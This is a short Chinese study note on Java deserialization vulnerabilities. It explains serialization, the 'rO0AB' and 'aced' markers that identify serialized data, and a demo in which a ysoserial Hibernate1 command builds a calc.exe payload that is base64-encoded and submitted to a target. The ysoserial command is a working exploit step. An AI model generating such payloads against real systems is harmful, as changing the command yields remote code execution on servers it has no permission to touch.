![image-20210825164252060](D:\BaiduNetdiskDownload\笔记\安全\WEB漏洞概述\反序列化漏洞\JAVA反序列化.assets\image-20210825164252060.png)

![image-20210825164505982](D:\BaiduNetdiskDownload\笔记\安全\WEB漏洞概述\反序列化漏洞\JAVA反序列化.assets\image-20210825164505982.png)

## 序列化和反序列化

```
序列化(Serialization): 将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。

反序列化:从存储区中读取该数据，并将其还原为对象的过程，称为反序列化。
```

下方的特征可以作为序列化的标志参考:

```
一段数据以rO0AB开头， 你基本可以确定这串就是JAVA序列化base64加密的数据。
或者如果以aced开头，那么他就是这一段java序列化的16进制。
```

## 案例：打开计算器

ysoserial工具生成payload

```
java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1. jar ysoserial.GeneratePayload Hibernate1 calc.exe >payload. bin
```

编码成base64

```
cat payload. bin | base64

echo "maibi" | base64			//base64加密
echo "bWFpYmkK" | base64 -d		//base64解密
```

提交base加密后的字符串

![image-20210827112713884](D:\BaiduNetdiskDownload\笔记\安全\WEB漏洞概述\反序列化漏洞\JAVA反序列化.assets\image-20210827112713884.png)
